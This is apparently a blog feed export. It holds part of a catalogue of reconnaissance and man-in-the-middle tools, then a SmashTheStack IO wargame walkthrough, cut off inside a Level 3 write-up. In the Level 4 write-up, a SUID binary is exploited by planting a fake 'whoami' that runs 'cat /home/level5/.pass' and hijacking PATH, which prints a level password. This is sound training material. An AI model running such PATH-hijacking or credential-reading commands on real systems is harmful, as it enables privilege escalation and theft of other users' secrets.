<p>Subdomain brute-forcing is another technique that should be used in the enumeration stage, as it&rsquo;s especially useful when other domain enumeration techniques such as zone transfers don&rsquo;t work (I rarely see zone transfers being <em>publicly</em> allowed these days by the way).</p>

<p><strong>dnsrecon</strong></p>

<p>DNS Enumueration and Scanning Tool</p>

<p>The script will perform the following:</p>

<p>Standard  Record  Enumeration for a given domain (A, NS, SOA and MX).</p>

<p>Top Leven Domain Expansion for a given domain.</p>

<p>Zone Transfer against all  NS records of a given domain.</p>

<p>Reverse Lookup against a given IP Range given a start and end IP.</p>

<p>SRV Record enumeration</p>

<p>Brute force hostnames and subdomains of a given target domain  using  a wordlist.</p>

<p><strong>dnsrevenum6</strong></p>

<p>Performs a fast reverse DNS enumeration and is able to cope with slow servers.</p>

<p><strong>dnstracer</strong></p>

<p>Determines where a given Domain Name Server (DNS) gets its information from, and follows the chain of DNS servers back to the servers which know the data.</p>

<p><strong>dnswalk</strong></p>

<p>DNS  debugger.  It performs zone transfers of specified domains, and checks the database in numerous ways for internal  consistency,  as well as for correctness according to accepted practices with the Domain Name System.</p>

<p><strong>fierce</strong></p>

<p>Fierce is a semi-lightweight scanner that helps locate non-contiguous
IP space and hostnames against specified domains.  It&rsquo;s really meant
as a pre-cursor to nmap, unicornscan, nessus, nikto, etc, since all
of those require that you already know what IP space you are looking
for.  This does not perform exploitation and does not scan the whole
internet indiscriminately.  It is meant specifically to locate likely
targets both inside and outside a corporate network.  Because it uses
DNS primarily you will often find mis-configured networks that leak
internal address space. That&rsquo;s especially useful in targeted malware.</p>

<p><strong>urlcrazy</strong></p>

<p>Generate and test domain typos and variations to detect and perform typo squatting, URL hijacking,
phishing, and corporate espionage.</p>

<h3>IDS/IPS Identification</h3>

<p><strong>fragroute</strong></p>

<p>intercept, modify, and rewrite egress traffic</p>

<p><strong>fragrouter</strong></p>

<p>network intrusion detection evasion toolkit</p>

<p><strong>ftest</strong></p>

<p>FTester is a tool designed for testing firewalls filtering policies and Intrusion Detection System (IDS) capabilities.</p>

<p><strong>lbd</strong></p>

<p>load balancing detector &ndash; Checks if a given domain uses load-balancing</p>

<p><strong>wafw00f</strong></p>

<p>Web Application Firewall Detection Tool</p>

<h3>Live Host Identification</h3>

<p><strong>alive6</strong></p>

<p>an effective alive scanner, which will detect all systems listening to this address</p>

<p><strong>arping</strong></p>

<p>sends ARP and/or ICMP requests to the specified host and  displays  the  replies.</p>

<p><strong>cdpsnarf</strong></p>

<p>Cisco Discovery Protocol Sniffer</p>

<p>CDPSnarf is a network sniffer exclusively written to extract
information from CDP packets.
It provides all the information a &ldquo;show cdp neighbors detail&rdquo;
command would return on a Cisco router and even more.</p>

<p><strong>detect-new-ip6</strong></p>

<p>This tool detects new IPv6 addresses joining the local network.</p>

<p><strong>detect_sniffer6</strong></p>

<p>Tests if systems on the local LAN are sniffing.
Works against Windows, Linux, OS/X and *BSD
If no target is given, the link-local-all-nodes address is used, which
however not always works.</p>

<p><strong>dmitry</strong></p>

<p>DMitry (Deepmagic Information Gathering Tool) is a UNIX/(GNU)Linux command line application with the ability to gather as much information as possible about a host.</p>

<p>Basic  functionality  of  DMitry  allows for information to be gathered
about a target host from a simple whois lookup on the target to  uptime
reports and TCP portscans.</p>

<p>The application is considered a tool to assist in information gathering
when information is required quickly by removing the need to enter multiple  commands  and  the timely process of searching through data from multiple sources.</p>

<p><strong>dnmap-client</strong> &amp; <strong>dnmap-server</strong></p>

<p>dnmap is a framework to distribute nmap scans among several clients. It reads an already created file with nmap commands and send those commands to each client connected to it. The framework use a client/server architecture. The server knows what to do and the clients do it. All the logic and statistics are managed in the server. Nmap output is stored on both server and client. Usually you would want this if you have to scan a large group of hosts and you have several different internet connections (or friends that want to help you)</p>

<p><strong>fping</strong></p>

<p>send ICMP ECHO_REQUEST packets to network hosts</p>

<p><strong>hping3</strong></p>

<p>hping3 is a network tool able to send custom TCP/IP packets and to display target replies like ping program does with  ICMP  replies.  hping3 handle  fragmentation,  arbitrary packets body and size and can be used in order to transfer  files  encapsulated  under  supported  protocols.
Using hping3 you are able to perform at least the following stuff:</p>

<ul>
<li>Test firewall rules</li>
<li>Advanced port scanning</li>
<li>Test net performance using different protocols, packet size, TOS (type of service) and fragmentation.</li>
<li>Path MTU discovery</li>
<li>Transferring files between even really fascist firewall rules.</li>
<li>Traceroute-like under different protocols.</li>
<li>Firewalk-like usage.</li>
<li>Remote OS fingerprinting.</li>
<li>TCP/IP stack auditing.</li>
<li>A lot of others.</li>
</ul>


<p><strong>inverse_lookup6</strong></p>

<p>Performs an inverse address query, to get the IPv6 addresses that are assigned
to a MAC address. Note that only few systems support this yet.</p>

<p><strong>miranda</strong></p>

<p>Miranda can discover UPnP hosts either passively or actively, and all of a host’s reported devices types, services, actions and variables can be enumerated with a single command.</p>

<p><strong>ncat</strong></p>

<p>Ncat is a feature-packed networking utility which reads and writes data
across networks from the command line. Ncat was written for the Nmap
Project and is the culmination of the currently splintered family of
Netcat incarnations. It is designed to be a reliable back-end tool to
instantly provide network connectivity to other applications and users.
Ncat will not only work with IPv4 and IPv6 but provides the user with a
virtually limitless number of potential uses.</p>

<p>Among Ncat&rsquo;s vast number of features there is the ability to chain
Ncats together; redirection of TCP, UDP, and SCTP ports to other sites;
SSL support; and proxy connections via SOCKS4 or HTTP proxies (with
optional proxy authentication as well).</p>

<p><strong>netdiscover</strong></p>

<p>an active/passive arp reconnaissance tool.</p>

<p><strong>passive_discovery6</strong></p>

<p>Passivly sniffs the network and dump all client&rsquo;s IPv6 addresses detected.</p>

<p><strong>thcping6</strong></p>

<p>Craft a ICMPv6/TCP/UDP packet with special IPv6 or EH header options.</p>

<p><strong>wol-e</strong></p>

<p>WOL-E is a suite of tools for the Wake on LAN feature of network attached computers, this is now enabled by default on many Apple computers. These tools include:</p>

<p>Bruteforcing the MAC address to wake up clients
Sniffing WOL attempts on the network and saving them to disk
Sniffing WOL passwords on the network and saving them to disk
Waking up single clients (post sniffing attack)
Scanning for Apple devices on the network for WOL enabling
Sending bulk WOL requests to all detected Apple clients.</p>

<p><strong>xprobe2</strong></p>

<p>xprobe2 is an active operating system fingerprinting tool with  a  different  approach  to operating system fingerprinting. xprobe2 relies on fuzzy  signature  matching,  probabilistic  guesses,  multiple  matches simultaneously, and a signature database.</p>

<h3>Network Scanners</h3>

<p><strong>nmap</strong></p>

<p>Nmap (“Network Mapper”) is an open source tool for network exploration
and security auditing. It was designed to rapidly scan large networks,
although it works fine against single hosts. Nmap uses raw IP packets
in novel ways to determine what hosts are available on the network,
what services (application name and version) those hosts are offering,
what operating systems (and OS versions) they are running, what type of
packet filters/firewalls are in use, and dozens of other
characteristics. While Nmap is commonly used for security audits, many
systems and network administrators find it useful for routine tasks
such as network inventory, managing service upgrade schedules, and
monitoring host or service uptime.</p>

<p><strong>unicornscan</strong></p>

<p>asynchronous network stimulus delivery/response recoring tool.</p>

<p><strong>zenmap</strong></p>

<p>Zenmap is a multi-platform graphical Nmap frontend and results viewer.
Zenmap aims to make Nmap easy for beginners to use while giving
experienced Nmap users advanced features. Frequently used scans can be
saved as profiles to make them easy to run repeatedly. A command
creator allows interactive creation of Nmap command lines. Scan results
can be saved and viewed later. Saved scan results can be compared with
one another to see how they differ. The results of recent scans are
stored in a searchable database.</p>

<h3>OS Fingerprinting</h3>

<p>Covered in the above</p>

<h3>OSINT Analysis</h3>

<p><strong>casefile</strong></p>

<p>CaseFile is the little brother to Maltego. It targets a unique market of &lsquo;offline&rsquo; analysts whose primary sources of information are not gained from the open-source intelligence side or can be programmatically queried. We see these people as investigators and analysts who are working &lsquo;on the ground&rsquo;, getting intelligence from other people in the team and building up an information map of their investigation.</p>

<p>CaseFile gives you the ability to quickly add, link and analyze data having the same graphing flexibility and performance as Maltego without the use of transforms.</p>

<p><strong>creepy</strong></p>

<p>creepy  is an application that allows you to gather geolocation related
information about users from  social  networking  platforms  and  image
hosting  services.  The  information  is  presented in a map inside the
application where all the retrieved data is shown accompanied with relevant information (i.e. what was posted from that specific location) to
provide context to the presentation.</p>

<p><img class="center" src="http://chousensha.github.io/images/creepy.png" title="creepy" alt="creepy"></p>

<p><strong>jigsaw</strong></p>

<p>Email harvesting, can search on jigsaw.com</p>

<p><strong>maltego</strong></p>

<p>Maltego is a program that can be used to determine the relationships and real world links between:</p>

<p>People</p>

<p>Groups of people (social networks)</p>

<p>Companies</p>

<p>Organizations</p>

<p>Web sites</p>

<p>Internet infrastructure such as:</p>

<p>Domains</p>

<p>DNS names</p>

<p>Netblocks</p>

<p>IP addresses</p>

<p>Phrases</p>

<p>Affiliations</p>

<p>Documents and files</p>

<p>These entities are linked using open source intelligence.</p>

<p><strong>metagoofil</strong></p>

<p>Metagoofil is an information gathering tool designed for extracting metadata of public documents (pdf,doc,xls,ppt,docx,pptx,xlsx) belonging to a target company.</p>

<p>Metagoofil will perform a search in Google to identify and download the documents to local disk and then will extract the metadata with different libraries like Hachoir, PdfMiner? and others. With the results it will generate a report with usernames, software versions and servers or machine names that will help Penetration testers in the information gathering phase.</p>

<p><strong>recon-ng</strong></p>

<p>Recon-ng is a full-featured Web Reconnaissance framework written in Python. Complete with independent modules, database interaction, built in convenience functions, interactive help, and command completion, Recon-ng provides a powerful environment in which open source web-based reconnaissance can be conducted quickly and thoroughly.</p>

<p><strong>theharvester</strong></p>

<p>The objective of this program is to gather emails, subdomains, hosts, employee names, open ports and banners from different public sources like search engines, PGP key servers and SHODAN computer database.</p>

<p><strong>twofi</strong></p>

<p>Twitter Words Of Interest</p>

<p>Build a custom wordlist based on Twitter keywords</p>

<h3>Route analysis</h3>

<p><strong>0trace</strong></p>

<p>Trace route to target</p>

<p><strong>intrace</strong></p>

<p>InTrace is a traceroute-like application that enables users to enumerate IP hops exploiting existing TCP connections, both initiated from local network (local system) or from remote hosts.</p>

<p><strong>netmask</strong></p>

<p>This  program  accepts and produces a variety of common network address
and netmask formats.  Not only can it convert address and netmask notations,  but it will optimize the masks to generate the smallest list of
rules.  This is very handy if you&rsquo;ve  ever  configured  a  firewall  or
router  and  some  nasty  network administrator before you decided that
base 10 numbers were good places to start and end groups of machines.</p>

<p><strong>trace6</strong></p>

<p>A basic but very fast traceroute6 program.
If no port is specified, ICMP6 Ping requests are used, otherwise TCP SYN
packets to the specified port.</p>

<h3>Service Fingerprinting</h3>

<p><strong>implementation6</strong></p>

<p>Performs some IPv6 implementation checks, can be used to test some
firewall features too. Takes approx. 2 minutes to complete.</p>

<p><strong>implementation6d</strong></p>

<p>Identifies test packets by the implementation6 tool, useful to check what
packets passed a firewall</p>

<p><strong>sslscan</strong></p>

<p>SSLScan is a fast SSL port scanner. SSLScan connects to SSL
ports and determines what  ciphers are supported, which are
the servers  preferred  ciphers,  which  SSL  protocols  are
supported  and   returns  the   SSL   certificate.   Client
certificates /  private key can be configured and output is
to text / XML.</p>

<p><strong>sslyze</strong></p>

<p>SSLyze is a Python tool that can analyze the SSL configuration of a server by connecting to it. It is designed to be fast and comprehensive, and should help organizations and testers identify misconfigurations affecting their SSL servers.</p>

<p><strong>tlssled</strong></p>

<p>ssl tls scanner</p>

<h3>SMB Analysis</h3>

<p><strong>acccheck</strong></p>

<p>Attempts to connect to the IPC$ and ADMIN$ shares depending on which flags have been
chosen, and tries a combination of usernames and passwords in the hope to identify
the password to a given account via a dictionary password guessing attack.</p>

<p><strong>nbtscan</strong></p>

<p>nbtscan is a program for scanning IP networks for NetBIOS name information.  It  sends NetBIOS status query to each address in supplied range and lists  received  information  in  human  readable  form.  For  each responded  host  it  lists IP address, NetBIOS computer name, logged-in user name and MAC address (such as Ethernet).</p>

<h3>SMTP Analysis</h3>

<p><strong>smtp-user-enum</strong></p>

<p>Username guessing tool primarily for use against the default Solaris SMTP service. Can use either EXPN, VRFY or RCPT TO</p>

<p><strong>swaks</strong></p>

<p>swaks&#8217; primary design goal is to be a flexible, scriptable,
transaction-oriented SMTP test tool.  It handles SMTP features and
extensions such as TLS, authentication, and pipelining; multiple
version of the SMTP protocol including SMTP, ESMTP, and LMTP; and
multiple transport methods including unix-domain sockets, internet-
domain sockets, and pipes to spawned processes.  Options can be
specified in environment variables, configuration files, and the
command line allowing maximum configurability and ease of use for
operators and scripters.</p>

<h3>SNMP Analysis</h3>

<p><strong>braa</strong></p>

<p>Braa is a tool for making SNMP queries. It is able to query hundreds or thousands of hosts simultaneously, while being completely single-threaded. It does not need any SNMP libraries, as it is equipped with its own SNMP engine</p>

<p><strong>cisco-auditing-tool</strong></p>

<p>Perl script which scans cisco routers for common vulnerabilities. Checks for default passwords, easily guessable community names, and the IOS history bug. Includes support for plugins and scanning multiple hosts.</p>

<p><strong>cisco-torch</strong></p>

<p>mass scanning, application layer fingerprinting, and exploitation tool to discover and attack remote Cisco hosts running Telnet, SSH, Web, TFTP, NTP and SNMP services. Useful in auditing large networks for misconfigured/un-updated Ciscos.</p>

<p><strong>copy-router-config</strong></p>

<p>copy an entire router configuration file from a Cisco device</p>

<p><strong>merge-router-config</strong></p>

<p>make changes to a Cisco router configuration file and merge those changes to a Cisco router</p>

<p><strong>onesixtyone</strong></p>

<p>simple SNMP scanner which sends requests for the  sys‐Descr value asynchronously with user-adjustable sending times.</p>

<p><strong>snmpcheck</strong></p>

<p>SNMP device enumerator</p>

<h3>SSL Analysis</h3>

<p><strong>sslcaudit</strong></p>

<p>This tool is designed to automate testing SSL/TLS clients for resistance against MITM attacks</p>

<p><strong>ssldump</strong></p>

<p>ssldump is an SSL/TLS network protocol analyzer. It identifies TCP connections on the chosen network interface and attempts to interpret them as  SSL/TLS traffic. When it identifies SSL/TLS traffic, it decodes the records and displays them in a textual form to stdout. If provided with the  appropriate  keying material, it will also decrypt the connections and display the application data traffic.</p>

<p><strong>sslh</strong></p>

<p>ssl/ssh multiplexer</p>

<p><strong>sslsniff</strong></p>

<p>sslsniff  is  designed  to  create man-in-the-middle (MITM) attacks for
SSL/TLS connections, and dynamically generates certs  for  the  domains
that  are  being  accessed  on  the  fly. The new certificates are constructed in a certificate chain that is signed by any certificate  that is provided.
sslsniff  also  supports other attacks like null-prefix or OCSP attacks
to achieve silent interceptions of connections when possible.</p>

<p><strong>sslsplit</strong></p>

<p>SSLsplit  is  a  tool  for  man-in-the-middle  attacks  against SSL/TLS
encrypted network connections.  Connections  are  transparently  intercepted  through  a network address translation engine and redirected to
SSLsplit.  SSLsplit terminates SSL/TLS and initiates a new SSL/TLS connection  to  the  original  destination address, while logging all data
transmitted.  SSLsplit is intended to be useful for  network  forensics
and penetration testing.</p>

<p><strong>sslstrip</strong></p>

<p>SSL/TLS man-in-the-middle attack tool</p>

<p><strong>stunnel</strong></p>

<p>The stunnel program is designed to work as SSL encryption wrapper
between remote clients and local (inetd-startable) or remote servers.
The concept is that having non-SSL aware daemons running on your system
you can easily set them up to communicate with clients over secure SSL channels.</p>

<h3>Telephony Analysis</h3>

<p><strong>ace</strong></p>

<p>Automated Corporate (Data) Enumerator</p>

<h3>Traffic Analysis</h3>

<p><strong>irpas-ass</strong></p>

<p>Autonomous System Scanner</p>

<p><strong>irpass-cdp</strong></p>

<p>This program is for sending CDP (Cisco router Discovery Protocol) messages to the wire.</p>

<p><strong>p0f</strong></p>

<p>P0f is a tool that utilizes an array of sophisticated, purely passive traffic
fingerprinting mechanisms to identify the players behind any incidental TCP/IP
communications (often as little as a single normal SYN) without interfering in
any way.</p>

<p>Some of its capabilities include:</p>

<ul>
<li><p>Highly scalable and extremely fast identification of the operating system
and software on both endpoints of a vanilla TCP connection &ndash; especially in
settings where NMap probes are blocked, too slow, unreliable, or would
simply set off alarms,</p></li>
<li><p>Measurement of system uptime and network hookup, distance (including
topology behind NAT or packet filters), and so on.</p></li>
<li><p>Automated detection of connection sharing / NAT, load balancing, and
application-level proxying setups.</p></li>
<li><p>Detection of dishonest clients / servers that forge declarative statements
such as X-Mailer or User-Agent.</p></li>
</ul>


<p><strong>tcpflow</strong></p>

<p>tcpflow is a program that captures data transmitted as part of TCP connections (flows), and stores the data in a way that is convenient for protocol analysis or debugging.</p>

<p><strong>wireshark</strong></p>

<p>Wireshark is a GUI network protocol analyzer.  It lets you
interactively browse packet data from a live network or from a
previously saved capture file.</p>

<h3>VoIP Analysis</h3>

<p><strong>enumiax</strong></p>

<p>enumIAX is an Inter Asterisk Exchange version 2 (IAX2) protocol username brute-force enumerator.</p>

<h3>VPN Analysis</h3>

<p><strong>ike-scan</strong></p>

<p>Discover and fingerprint IKE hosts (IPsec VPN servers)</p>

<p>Ok, that took forever. I will make posts with the other categories as well.</p>

<blockquote><p>The only way to keep your health is to eat what you don&rsquo;t want, drink what
you don&rsquo;t like, and do what you&rsquo;d rather not.</p>

<p>&mdash; Mark Twain</p></blockquote>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[SmashTheStack IO Level 4]]></title>
    <link href="http://chousensha.github.io/blog/2014/07/07/smashthestack-io-level-4/"/>
    <updated>2014-07-07T22:24:52+03:00</updated>
    <id>http://chousensha.github.io/blog/2014/07/07/smashthestack-io-level-4</id>
    <content type="html"><![CDATA[<p>We have source code for this level as well in level04.c:</p>

<!-- more -->




<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="c1">//writen by bla</span>
</span><span class='line'><span class="cp">#include &lt;stdlib.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
</span><span class='line'>        <span class="kt">char</span> <span class="n">username</span><span class="p">[</span><span class="mi">1024</span><span class="p">];</span>
</span><span class='line'>        <span class="kt">FILE</span><span class="o">*</span> <span class="n">f</span> <span class="o">=</span> <span class="n">popen</span><span class="p">(</span><span class="s">&quot;whoami&quot;</span><span class="p">,</span><span class="s">&quot;r&quot;</span><span class="p">);</span>
</span><span class='line'>        <span class="n">fgets</span><span class="p">(</span><span class="n">username</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">username</span><span class="p">),</span> <span class="n">f</span><span class="p">);</span>
</span><span class='line'>        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Welcome %s&quot;</span><span class="p">,</span> <span class="n">username</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<h4>Function overview</h4>

<p><strong>popen</strong></p>

<p><em>FILE <em>popen(const char </em>command, const char *type);</em></p>

<p>Opens a process by creating a pipe,  forking,  and invoking  the shell.  Since a pipe is by definition unidirectional, the type argument may specify  only  reading  or  writing,  not  both;  the resulting stream is correspondingly read-only or write-only.</p>

<p>The  command argument is a pointer to a null-terminated string containing a shell command line.  This command is passed to /bin/sh using  the -c  flag;  interpretation, if any, is performed by the shell.  The type argument is a pointer to a null-terminated string  which  must  contain either the letter &lsquo;r&rsquo; for reading or the letter &lsquo;w&rsquo; for writing.  Since glibc 2.9, this argument can additionally include the letter &lsquo;e&rsquo;, which causes  the close-on-exec flag (FD_CLOEXEC) to be set on the underlying file descriptor.</p>

<p>The  return  value  from popen() is a normal standard I/O stream in all respects save  that  it  must  be  closed  with  pclose()  rather  than <em>fclose(3)</em>.   Writing  to  such a stream writes to the standard input of the command; the command&rsquo;s standard output is the same as that  of  the process  that  called  popen(),  unless  this is altered by the command itself.  Conversely, reading from a &ldquo;popened&rdquo;  stream  reads  the  command&rsquo;s standard output, and the command&rsquo;s standard input is the same as that of the process that called popen().</p>

<p>Note that output popen() streams are fully buffered by default.</p>

<p>The popen() function returns NULL if the <em>fork(2)</em> or <em>pipe(2)</em> calls fail, or if it cannot allocate memory.</p>

<p>The popen() function does not set errno if memory allocation fails.  If the underlying fork(2) or pipe(2) fails, errno  is  set  appropriately. If  the type argument is invalid, and this condition is detected, errno is set to EINVAL.</p>

<p>Since the standard input of a command opened  for  reading  shares  its seek  offset  with  the  process  that  called popen(), if the original process has done a buffered read, the command&rsquo;s input position may  not be  as expected.  Similarly, the output from a command opened for writing may become intermingled with that of  the  original  process.   The latter can be avoided by calling fflush(3) before popen().</p>

<p>Failure  to  execute  the  shell  is indistinguishable from the shell&rsquo;s failure to execute command, or an immediate exit of the  command.   The only hint is an exit status of 127.</p>

<p><strong>fgets</strong></p>

<p><em>char <em>fgets(char </em>str, int num, FILE *stream);</em></p>

<p>The <em>fgets()</em> function reads up to <em>num–1</em> characters from <em>stream</em> and stores them in the character array pointed to by <em>str</em>. Characters are read until either a newline or an EOF is received or until the specified limit is reached. After the characters have been read, a null is stored in the array immediately after the last character read. A newline character will be retained and will be part of the array pointed to by <em>str</em>.</p>

<p>On success, the function returns <em>str</em>.
If the end-of-file is encountered while attempting to read a character, the eof indicator is set (<em>feof</em>). If this happens before any characters could be read, the pointer returned is a null pointer (and the contents of <em>str</em> remain unchanged).
If a read error occurs, the error indicator (<em>ferror</em>) is set and a null pointer is also returned (but the contents pointed by <em>str</em> may have changed).</p>

<h4>Program description</h4>

<p>This program executes a shell command and prints the results. If we try to run it, we see this:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>level4@io:/levels$ ./level04
</span><span class='line'>Welcome level5</span></code></pre></td></tr></table></div></figure>


<p>This makes sense, since it&rsquo;s a SUID binary owned by the level5 user. What we want to do is substitue the command called by popen with one that will help us advance, like <code>cat /home/level5/.pass</code></p>

<p>We can&rsquo;t directly influence the program since it doesn&rsquo;t take user input. But we know that the change must occur in the popen line. So in that line, it opens a pipe for reading to the <em>whoami</em> command. We can&rsquo;t put another command its place, but maybe we don&rsquo;t have to. How does the program know where to find whoami? Let&rsquo;s first find it ourselves:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>level4@io:/levels$ which whoami
</span><span class='line'>/usr/bin/whoami</span></code></pre></td></tr></table></div></figure>


<p>For this we have to understand the concept of PATH:</p>

<blockquote><p>PATH is an environmental variable in Linux and other Unix-like operating systems that tells the shell which directories to search for
executable files in response to commands issued by a user.
Each user on a system can have a different PATH variable.</p>

<p>(The Linux Information Project)</p></blockquote>

<p>To see the contents of our PATH variable, we do this:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>level4@io:/levels$ echo $PATH
</span><span class='line'>/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games</span></code></pre></td></tr></table></div></figure>


<p>So this is how the program knew how to find whoami. It just searched those directories until it found it. And we know we can add a new directory to our default search path with one of the below commands:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>PATH="directory:$PATH"
</span><span class='line'>
</span><span class='line'>PATH=$PATH:directory
</span><span class='line'>export PATH
</span><span class='line'>
</span><span class='line'>export PATH=$PATH:directory</span></code></pre></td></tr></table></div></figure>


<p>Now we should get an idea of the steps to exploit the program. We can create our own directory and store in it a program named whoami that would do what we want it to. Then should add that directory to our path, and then level04 program searches for whoami, it will hit upon our own whoami version instead. Let&rsquo;s do that now.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>level4@io:/levels$ mkdir /tmp/mydir
</span><span class='line'>level4@io:/tmp/mydir$ echo "cat /home/level5/.pass" &gt; /tmp/mydir/whoami
</span><span class='line'>level4@io:/tmp/mydir$ ls -l whoami
</span><span class='line'>-rw-r--r-- 1 level4 level4 23 Jul 17 17:44 whoami</span></code></pre></td></tr></table></div></figure>


<p>If we leave it like this, the permissions won&rsquo;t allow it to be executed, so I make it readable, writable and executable for everyone with the following:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>chmod 777 whoami
</span><span class='line'>level4@io:/tmp/mydir$ ls -l whoami
</span><span class='line'>-rwxrwxrwx 1 level4 level4 23 Jul 17 17:44 whoami</span></code></pre></td></tr></table></div></figure>


<p>Now add our directory to our PATH:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>level4@io:/tmp/mydir$ PATH="/tmp/mydir:$PATH"
</span><span class='line'>level4@io:/tmp/mydir$ echo $PATH
</span><span class='line'>/tmp/mydir:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games</span></code></pre></td></tr></table></div></figure>


<p>All that&rsquo;s left is to run the level04 binary and collect the password:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>level4@io:/tmp/mydir$ /levels/level04
</span><span class='line'>Welcome KGpWsju2vDpmxcxlvm</span></code></pre></td></tr></table></div></figure>


<blockquote><p>Work consists of whatever a body is obliged to do.
Play consists of whatever a body is not obliged to do.</p>

<p>&mdash; Mark Twain</p></blockquote>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[SmashTheStack IO Level 3]]></title>
    <link href="http://chousensha.github.io/blog/2014/07/07/smashthestack-io-level-3/"/>
    <updated>2014-07-07T21:37:07+03:00</updated>
    <id>http://chousensha.github.io/blog/2014/07/07/smashthestack-io-level-3</id>
    <content type="html"><![CDATA[<p>This is the source code for level03.c:</p>

<!-- more -->




<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="c1">//bla, based on work by beach</span>
</span><span class='line'>
</span><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;string.h&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="kt">void</span> <span class="nf">good</span><span class="p">()</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>        <span class="n">puts</span><span class="p">(</span><span class="s">&quot;Win.&quot;</span><span class="p">);</span>
</span><span class='line'>        <span class="n">execl</span><span class="p">(</span><span class="s">&quot;/bin/sh&quot;</span><span class="p">,</span> <span class="s">&quot;sh&quot;</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'><span class="kt">void</span> <span class="nf">bad</span><span class="p">()</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;I&#39;m so sorry, you&#39;re at %p and you want to be at %p</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">bad</span><span class="p">,</span> <span class="n">good</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>        <span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="n">functionpointer</span><span class="p">)(</span><span class="kt">void</span><span class="p">)</span> <span class="o">=</span> <span class="n">bad</span><span class="p">;</span>
</span><span class='line'>        <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">50</span><span class="p">];</span>
</span><span class='line'>
